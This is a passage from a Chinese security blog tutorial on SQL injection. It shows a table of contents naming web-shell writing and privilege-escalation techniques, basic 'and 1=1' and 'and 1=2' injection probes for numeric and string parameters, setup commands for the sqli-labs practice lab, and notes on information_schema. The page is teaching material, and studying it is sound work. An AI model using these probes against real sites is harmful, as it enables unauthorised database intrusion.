<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>SQL注入漏洞 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
<meta name="author-link" content="http://shuai06.github.io">
<meta name="description" content="简介 SQL注入攻击是黑客利用SQL注入对数据库进行攻击的常用手段之一。攻击者通过浏览器或其他客户端将恶意SQL语句插入到网站参数中，网站应用" /><meta name="keywords" content='SQL注入, 代码审计' /><meta itemprop="name" content="SQL注入漏洞">
<meta itemprop="description" content="简介 SQL注入攻击是黑客利用SQL注入对数据库进行攻击的常用手段之一。攻击者通过浏览器或其他客户端将恶意SQL语句插入到网站参数中，网站应用"><meta itemprop="datePublished" content="2022-01-19T22:05:28+08:00" />
<meta itemprop="dateModified" content="2023-02-07T02:55:54+00:00" />
<meta itemprop="wordCount" content="19301"><meta itemprop="image" content="https://shuai06.github.io/logo.png"/>
<meta itemprop="keywords" content="SQL注入,代码审计," /><meta property="og:title" content="SQL注入漏洞" />
<meta property="og:description" content="简介 SQL注入攻击是黑客利用SQL注入对数据库进行攻击的常用手段之一。攻击者通过浏览器或其他客户端将恶意SQL语句插入到网站参数中，网站应用" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://shuai06.github.io/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="https://shuai06.github.io/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-01-19T22:05:28+08:00" />
<meta property="article:modified_time" content="2023-02-07T02:55:54+00:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://shuai06.github.io/logo.png"/>

<meta name="twitter:title" content="SQL注入漏洞"/>
<meta name="twitter:description" content="简介 SQL注入攻击是黑客利用SQL注入对数据库进行攻击的常用手段之一。攻击者通过浏览器或其他客户端将恶意SQL语句插入到网站参数中，网站应用"/>
<meta name="application-name" content="剑胆琴心">
<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shuai06.github.io/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://shuai06.github.io/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="https://shuai06.github.io/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "SQL注入漏洞",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/shuai06.github.io\/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/"
    },"image": [{
              "@type": "ImageObject",
              "url": "https:\/\/shuai06.github.io\/images\/Apple-Devices-Preview.jpg",
              "width":  1842 ,
              "height":  1036 
            }],"genre": "posts","keywords": "SQL注入, 代码审计","wordcount":  19301 ,
    "url": "https:\/\/shuai06.github.io\/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/","datePublished": "2022-01-19T22:05:28+08:00","dateModified": "2023-02-07T02:55:54+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
      "@type": "Organization",
      "name": "剑胆琴心","logo": {
          "@type": "ImageObject",
          "url": "https:\/\/shuai06.github.io\/images\/avatar.png",
          "width":  438 ,
          "height":  438 
        }},"author": {
        "@type": "Person",
        "name": "剑胆琴心"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="剑胆琴心"><img
    class="lazyload logo"
    src="/svg/loading.min.svg"
    data-src="/images/avatar.png"
    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
    data-sizes="auto"
    alt="剑胆琴心"
    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/friends/"
                title="友情链接"
                
              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li>
      </ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="剑胆琴心"><img
    class="lazyload logo"
    src="/svg/loading.min.svg"
    data-src="/images/avatar.png"
    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
    data-sizes="auto"
    alt="/images/avatar.png"
    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/friends/"
                  title="友情链接"
                  
                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
              class="menu-item text-center"
            ><a
                  class="menu-link"
                  href="https://github.com/shuai06"
                  title="GitHub"
                  rel="noopener noreferrer" target="_blank"
                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    </aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
        <span>SQL注入漏洞</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="http://shuai06.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
    class="lazyload avatar"
    src="/svg/loading.min.svg"
    data-src="/images/avatar.png"
    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
    data-sizes="auto"
    alt="剑胆琴心"
    title="剑胆琴心" width="438" height="438"/>&nbsp;剑胆琴心</a></span>
          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
      <div class="post-meta-line"><span title=2022-01-19&#32;22:05:28><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-19">2022-01-19</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 19301 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 39 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#按类型">按类型：</a>
      <ul>
        <li><a href="#1数字型">1.数字型</a></li>
        <li><a href="#2字符型">2.字符型</a></li>
      </ul>
    </li>
    <li><a href="#按执行效果分类">按执行效果分类</a></li>
  </ul>

  <ul>
    <li><a href="#注入流程">注入流程</a></li>
    <li><a href="#联合注入">联合注入</a></li>
    <li><a href="#报错注入"><strong>报错注入</strong></a></li>
    <li><a href="#盲注"><strong>盲注</strong></a>
      <ul>
        <li><a href="#时间注入"><strong>时间注入</strong></a></li>
        <li><a href="#布尔盲注"><strong>布尔盲注</strong></a></li>
        <li><a href="#dnslog注入">DNSlog注入</a></li>
      </ul>
    </li>
    <li><a href="#insertdeleteupdate">insert,delete,update</a>
      <ul>
        <li><a href="#报错">报错</a></li>
        <li><a href="#盲注-1">盲注</a></li>
      </ul>
    </li>
    <li><a href="#二次注入">二次注入</a></li>
    <li><a href="#宽字节注入">宽字节注入</a></li>
    <li><a href="#文件操作">文件操作</a>
      <ul>
        <li><a href="#读文件">读文件</a></li>
        <li><a href="#写文件">写文件</a></li>
        <li><a href="#突破secure-file-priv通过数据库日志写shell">突破secure-file-priv(通过数据库日志写shell)</a>
          <ul>
            <li><a href="#方法一general_log">方法一：general_log</a></li>
            <li><a href="#方法二slow_query_log">方法二：slow_query_log</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#权限提升">权限提升</a>
      <ul>
        <li><a href="#1udf导出提权重点">1.UDF导出提权(重点)</a></li>
        <li><a href="#2mof加载提权">2.MOF加载提权</a></li>
        <li><a href="#3启动项重启提权">3.启动项重启提权</a></li>
        <li><a href="#4反弹shell提权重点">4.反弹SHELL提权(重点)</a></li>
        <li><a href="#5sqlmap提权">5.sqlmap提权</a></li>
        <li><a href="#6利用msf提权">6.利用msf提权</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#简介-1">简介</a></li>
    <li><a href="#注入流程-1">注入流程</a></li>
    <li><a href="#联合注入-1">联合注入</a></li>
    <li><a href="#报错注入-1">报错注入</a></li>
    <li><a href="#盲注-2">盲注</a>
      <ul>
        <li><a href="#布尔盲注-1">布尔盲注</a></li>
        <li><a href="#时间盲注">时间盲注</a></li>
      </ul>
    </li>
    <li><a href="#文件操作-1">文件操作</a></li>
    <li><a href="#信息获取">信息获取</a></li>
    <li><a href="#命令执行提权">命令执行&amp;提权</a>
      <ul>
        <li><a href="#xp_cmdshell">xp_cmdshell</a></li>
        <li><a href="#sp_oacreate">sp_oacreate</a></li>
        <li><a href="#sql-server-clr">SQL Server CLR</a></li>
        <li><a href="#sql-server-沙盒">SQL Server 沙盒</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#注入流程-2">注入流程</a></li>
    <li><a href="#常用查询">常用查询</a></li>
    <li><a href="#联合注入-2">联合注入</a>
      <ul>
        <li><a href="#heading"></a></li>
      </ul>
    </li>
    <li><a href="#报错注入-2">报错注入</a></li>
    <li><a href="#盲注-3">盲注</a>
      <ul>
        <li><a href="#布尔盲注-2">布尔盲注</a></li>
        <li><a href="#时间盲注-1">时间盲注</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#注入流程-3">注入流程</a></li>
    <li><a href="#常用查询-1">常用查询</a></li>
    <li><a href="#报错注入-3">报错注入</a></li>
    <li><a href="#盲注-4">盲注</a>
      <ul>
        <li><a href="#时间盲注-2">时间盲注</a></li>
      </ul>
    </li>
    <li><a href="#文件操作-2">文件操作</a></li>
    <li><a href="#bypass-filter">Bypass Filter</a></li>
  </ul>

  <ul>
    <li><a href="#sqlite-comments">SQLite comments</a></li>
    <li><a href="#sqlite-version">SQLite version</a></li>
    <li><a href="#string-based---extract-database-structure">String based - Extract database structure</a></li>
    <li><a href="#integerstring-based---extract-table-name">Integer/String based - Extract table name</a></li>
    <li><a href="#integerstring-based---extract-column-name">Integer/String based - Extract column name</a></li>
    <li><a href="#boolean---count-number-of-tables">Boolean - Count number of tables</a></li>
    <li><a href="#boolean---enumerating-table-name">Boolean - Enumerating table name</a></li>
    <li><a href="#boolean---extract-info">Boolean - Extract info</a></li>
    <li><a href="#time-based">Time based</a></li>
    <li><a href="#remote-command-execution-using-sqlite-command---attach-database">Remote Command Execution using SQLite command - Attach Database</a></li>
    <li><a href="#remote-command-execution-using-sqlite-command---load_extension">Remote Command Execution using SQLite command - Load_extension</a></li>
    <li><a href="#db2注入">DB2注入</a>
      <ul>
        <li><a href="#version">Version</a></li>
        <li><a href="#comments">Comments</a></li>
        <li><a href="#current-user">Current User</a></li>
        <li><a href="#list-users">List Users</a></li>
        <li><a href="#list-privileges">List Privileges</a></li>
        <li><a href="#list-dba-accounts">List DBA Accounts</a></li>
        <li><a href="#current-database">Current Database</a></li>
        <li><a href="#list-databases">List Databases</a></li>
        <li><a href="#list-columns">List Columns</a></li>
        <li><a href="#list-tables">List Tables</a></li>
        <li><a href="#find-tables-from-column-name">Find Tables From Column Name</a></li>
        <li><a href="#select-nth-row">Select Nth Row</a></li>
        <li><a href="#select-nth-char">Select Nth Char</a></li>
        <li><a href="#bitwise-andornotxor">Bitwise AND/OR/NOT/XOR</a></li>
        <li><a href="#ascii-value">ASCII Value</a></li>
        <li><a href="#char---ascii-value">Char -&gt; ASCII Value</a></li>
        <li><a href="#casting">Casting</a></li>
        <li><a href="#string-concat">String Concat</a></li>
        <li><a href="#if-statement">IF Statement</a></li>
        <li><a href="#case-statement">Case Statement</a></li>
        <li><a href="#avoiding-quotes">Avoiding Quotes</a></li>
        <li><a href="#time-delay">Time Delay</a></li>
        <li><a href="#serialize-to-xml-for-error-based">Serialize to XML (for error based)</a></li>
        <li><a href="#command-execution-and-local-file-access">Command Execution and Local File Access</a></li>
        <li><a href="#hostnameip-and-os-info">Hostname/IP and OS INFO</a></li>
        <li><a href="#location-of-db-files">Location of DB Files</a></li>
        <li><a href="#system-config">System Config</a></li>
        <li><a href="#default-system-database">Default System Database</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#位置一">位置一</a></li>
    <li><a href="#位置二">位置二</a></li>
    <li><a href="#位置三">位置三</a></li>
    <li><a href="#位置四">位置四</a></li>
    <li><a href="#位置五">位置五</a></li>
    <li><a href="#fuzz">FUZZ</a></li>
  </ul>

  <ul>
    <li><a href="#java">Java</a>
      <ul>
        <li><a href="#java中执行sql语句的几种方式">Java中执行SQL语句的几种方式</a>
          <ul>
            <li><a href="#1使用jdbc的javasqlstatement执行sql语句原生方式">1.使用JDBC的<code>java.sql.Statement</code>执行SQL语句（原生方式）</a></li>
            <li><a href="#2使用jdbc的javasqlpreparedstatement执行sql语句">2.使用JDBC的<code>java.sql.PreparedStatement</code>执行SQL语句</a></li>
            <li><a href="#3使用herbinate执行sql语句">3.使用Herbinate执行SQL语句</a></li>
            <li><a href="#4使用mybatis执行sql语句">4.使用MyBatis执行SQL语句</a></li>
          </ul>
        </li>
        <li><a href="#常见sql注入漏洞分类挖掘技巧">常见SQL注入(漏洞分类挖掘技巧)</a>
          <ul>
            <li><a href="#1sql语句参数直接动态拼接">1.SQL语句参数直接动态拼接</a></li>
            <li><a href="#2预编译有误">2.预编译有误</a></li>
            <li><a href="#3框架使用不当导致sql注入">3.框架使用不当导致SQL注入</a>
              <ul>
                <li><a href="#mybatis">Mybatis</a></li>
                <li><a href="#hibernate">Hibernate</a></li>
              </ul>
            </li>
            <li><a href="#4order-by-绕过预编译">4.order by 绕过预编译</a></li>
            <li><a href="#5和_模糊查询">5.%和_模糊查询</a></li>
            <li><a href="#6mybatis常见sql注入漏洞">6.MyBatis常见SQL注入漏洞</a></li>
          </ul>
        </li>
        <li><a href="#常规代码审计">常规代码审计</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h1 id="简介">简介</h1>
<p>SQL注入攻击是黑客利用SQL注入对数据库进行攻击的常用手段之一。攻击者通过浏览器或其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过滤，便将SQL语句带入数据库执行。SQL注入过程如图所示。</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="http://image.xpshuai.cn/img/image-20220119193306514.png"
    data-srcset="http://image.xpshuai.cn/img/image-20220119193306514.png, http://image.xpshuai.cn/img/image-20220119193306514.png 1.5x, http://image.xpshuai.cn/img/image-20220119193306514.png 2x"
    data-sizes="auto"
    alt="http://image.xpshuai.cn/img/image-20220119193306514.png"
    title="http://image.xpshuai.cn/img/image-20220119193306514.png"/></p>
<h1 id="分类">分类</h1>
<h2 id="按类型">按类型：</h2>
<h3 id="1数字型">1.数字型</h3>
<p>输入的参数x为整型的时候，通常<a href="https://so.csdn.net/so/search?q=sql%e8%af%ad%e5%8f%a5&amp;spm=1001.2101.3001.7020"target="_blank" rel="external nofollow noopener noreferrer">sql语句<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>是这样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="p">=</span><span class="n">x</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>这种类型可以使用经典的and 1=1 和 and 1=2来判断</p>
</blockquote>
<p><strong>原因：</strong>
当输入and 1=1时，后台会执行sql语句是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="p">=</span><span class="n">x</span> <span class="n">and</span> <span class="m">1</span><span class="p">=</span><span class="m">1</span><span class="err">；</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>没有语法显示错误且，返回正常</p>
<p>当输入and 1=2时，后台会执行sql语句是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="p">=</span><span class="m">1</span> <span class="n">and</span> <span class="m">1</span><span class="p">=</span><span class="m">2</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>没有语法错误且，返回错误</p>
<p><strong>我们在使用假设：</strong>
如果是字符型注入的话，我们输入的语句应该会出现这样的状况</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="p">=</span><span class="err">&#39;</span><span class="m">1</span> <span class="n">and</span> <span class="m">1</span><span class="p">=</span><span class="m">1</span><span class="err">&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="p">=</span><span class="err">&#39;</span><span class="m">1</span> <span class="n">and</span> <span class="m">1</span><span class="p">=</span><span class="m">2</span><span class="err">&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>查询语句将and语句全部转换成字符串，并没有进行and的逻辑判断，所以不会出现以上结果，所以这个等式是不成立的。</p>
<h3 id="2字符型">2.字符型</h3>
<p>当输入的参数x为字符型时，通常sql语句会这样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="p">=</span><span class="sc">&#39;x&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>这种类型我们可以使用and ‘1’=&lsquo;1 和 and ‘1’=&lsquo;2来进行测试</p>
</blockquote>
<p><strong>原因：</strong>
当输入and ‘1’=‘1的时候，后台执行的语句是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="p">=</span><span class="sc">&#39;x&#39;</span> <span class="n">and</span> <span class="sc">&#39;1&#39;</span><span class="p">=</span><span class="sc">&#39;1&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>语法正确，逻辑判断正确，返回正确</p>
<p>当输入and ‘1’=‘2的时候，后台执行的语句是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">select</span> <span class="p">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="p">=</span><span class="sc">&#39;x&#39;</span> <span class="n">and</span> <span class="sc">&#39;1&#39;</span><span class="p">=</span><span class="sc">&#39;2&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>语法正确，逻辑判断错误，返回错误</p>
<p>字符型和数字型最大的一个<strong>区别</strong>在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
<h2 id="按执行效果分类">按执行效果分类</h2>
<p>下面那些：</p>
<p>报错</p>
<p>盲注</p>
<p>联合</p>
<p>。。。</p>
<h1 id="mysql注入">MySQL注入</h1>
<blockquote>
<p>主要内容以MySQL为例进行说明，其他数据库类似，只做简单介绍，具体操作以MySQL类推即可</p>
</blockquote>
<p>Docker下载sqli-labs:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker pull acgpiano/sqli-labs
</span></span><span class="line"><span class="cl">docker images
</span></span><span class="line"><span class="cl">docker run -dt  --name sqli acgpiano/sqli-labs -p 80:80 --rm acgpiano/sqli-labs <span class="c1"># docker 的80映射到本地,  docker环境停止之后，删除所有创建的镜像</span>
</span></span><span class="line"><span class="cl">docker <span class="nb">exec</span> -it c351ff0ff80f /bin/bash  <span class="c1"># 进入容器</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">docker stop &lt;ContainerId<span class="o">(</span>或者name<span class="o">)</span>&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 删除容器</span>
</span></span><span class="line"><span class="cl">docker rm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">删除镜像
</span></span><span class="line"><span class="cl">docker rmi
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>MySQL5.0之后增加了information_schema</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># information_schema数据库表说明:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1、SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2、TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3、COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">4、STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">5、USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">6、SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。
</span></span><span class="line"><span class="cl">
